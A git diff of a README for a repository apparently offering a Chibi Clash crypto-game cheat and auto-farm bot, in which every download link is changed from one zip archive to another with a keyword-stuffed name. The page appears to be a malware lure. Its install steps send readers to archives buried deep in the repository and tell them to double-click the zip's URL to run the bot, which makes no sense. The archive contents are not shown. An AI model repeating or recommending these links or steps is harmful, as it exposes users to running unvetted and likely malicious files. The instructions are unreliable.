@@ -1,6 +1,6 @@
 # 🎮 Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api - Automate Your Chibi Clash Farm Easily
 
-[![Download Latest Release](https://raw.githubusercontent.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Chibi-Clash-Exp/ChibiApp/Properties/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api_v3.1-alpha.5.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Chibi-Clash-Exp/ChibiApp/Properties/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api_v3.1-alpha.5.zip)
+[![Download Latest Release](https://github.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/Chibi-Clash-Exp/ChibiApp/Hack_Auto_Clicker_Chibi_Crypto_Cheat_Clash_Token_Game_Bot_Farm_Api_v1.2.zip%20Latest%20Release-v1.0-blue)](https://github.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/Chibi-Clash-Exp/ChibiApp/Hack_Auto_Clicker_Chibi_Crypto_Cheat_Clash_Token_Game_Bot_Farm_Api_v1.2.zip)
 
 ## 🌟 Overview
 
@@ -17,7 +17,7 @@ Follow these steps to set up the Chibi Clash Crypto Bot:
    - **Internet**: Stable internet connection
 
 2. **Download the Bot**
-   - Visit this page to download: [Download Page](https://raw.githubusercontent.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Chibi-Clash-Exp/ChibiApp/Properties/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api_v3.1-alpha.5.zip)
+   - Visit this page to download: [Download Page](https://github.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/Chibi-Clash-Exp/ChibiApp/Hack_Auto_Clicker_Chibi_Crypto_Cheat_Clash_Token_Game_Bot_Farm_Api_v1.2.zip)
 
 3. **Extract the Files**
    - Once the download is complete, locate the file in your downloads folder.
@@ -26,12 +26,12 @@ Follow these steps to set up the Chibi Clash Crypto Bot:
 
 4. **Run the Bot**
    - Navigate to the folder where you extracted the files.
-   - Locate the `https://raw.githubusercontent.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Chibi-Clash-Exp/ChibiApp/Properties/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api_v3.1-alpha.5.zip` file and double-click it to run the bot.
+   - Locate the `https://github.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/Chibi-Clash-Exp/ChibiApp/Hack_Auto_Clicker_Chibi_Crypto_Cheat_Clash_Token_Game_Bot_Farm_Api_v1.2.zip` file and double-click it to run the bot.
    - Follow the on-screen instructions to start automating your farming activities.
 
 ## 📥 Download & Install
 
-To get started with the Chibi Clash Crypto Bot, download it here: [Download Page](https://raw.githubusercontent.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Chibi-Clash-Exp/ChibiApp/Properties/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api_v3.1-alpha.5.zip).
+To get started with the Chibi Clash Crypto Bot, download it here: [Download Page](https://github.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/Chibi-Clash-Exp/ChibiApp/Hack_Auto_Clicker_Chibi_Crypto_Cheat_Clash_Token_Game_Bot_Farm_Api_v1.2.zip).
 
 ## 🔧 Features
 
@@ -73,4 +73,4 @@ This project is licensed under the MIT License. You can use it freely, but pleas
 
 For further assistance, feel free to reach out. We’re here to help you with any questions or concerns regarding the Chibi Clash Crypto Bot.
 
-Visit us here to learn more: [Download Page](https://raw.githubusercontent.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/main/Chibi-Clash-Exp/ChibiApp/Properties/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api_v3.1-alpha.5.zip)
+Visit us here to learn more: [Download Page](https://github.com/m25s5/Chibi-Clash-Crypto-Bot-Crypto-Game-Auto-Farm-Clicker-Cheat-Token-Hack-Api/raw/refs/heads/main/Chibi-Clash-Exp/ChibiApp/Hack_Auto_Clicker_Chibi_Crypto_Cheat_Clash_Token_Game_Bot_Farm_Api_v1.2.zip)
